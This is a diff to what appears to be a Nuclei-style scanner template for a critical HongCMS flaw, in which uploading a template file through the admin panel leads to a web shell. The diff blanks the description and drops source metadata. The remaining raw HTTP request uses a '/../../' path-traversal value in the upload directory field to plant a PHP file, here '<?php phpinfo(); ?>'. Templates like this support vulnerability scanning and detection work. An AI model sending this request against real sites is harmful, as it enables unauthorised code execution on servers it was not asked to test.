@@ -3,12 +3,8 @@ info:
   name: HongCMS 目录穿越的后台模版文件上传造成的getshell
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gan3cbwdsvsluafh'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gan3cbwdsvsluafh
-    fofa: 暂无
 http:
 - raw:
   - 'POST /admin/index.php/template/upload HTTP/1.1
@@ -38,14 +34,10 @@ http:
     Connection: close
 
 
-
-
     ------WebKitFormBoundaryMer1nJdTsRVrRPZ6
 
 
     Content-Disposition: form-data; name="dir"
-
-
 
 
     /../../
@@ -58,8 +50,6 @@ http:
 
 
     Content-Type: application/octet-stream
-
-
 
 
     <?php phpinfo(); ?>
